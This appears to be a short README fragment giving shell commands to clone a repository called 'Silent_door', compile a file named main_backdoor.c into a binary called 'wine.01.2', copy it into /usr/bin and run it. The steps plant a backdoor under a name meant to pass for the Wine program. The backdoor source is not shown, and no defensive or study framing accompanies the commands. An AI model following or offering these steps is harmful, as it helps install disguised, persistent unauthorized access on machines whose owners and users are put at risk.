git clone https://github.com/mrx6SO/Silent_door
cd Silent_door 

apt install libx11-dev && apt-get update && apt upgrade -y 
cc main_backdoor.c -o wine.01.2 -lm -w -lX11 


cp wine.01.2 /usr/bin 

chmod +x wine.01.2 
./wine.01.2 

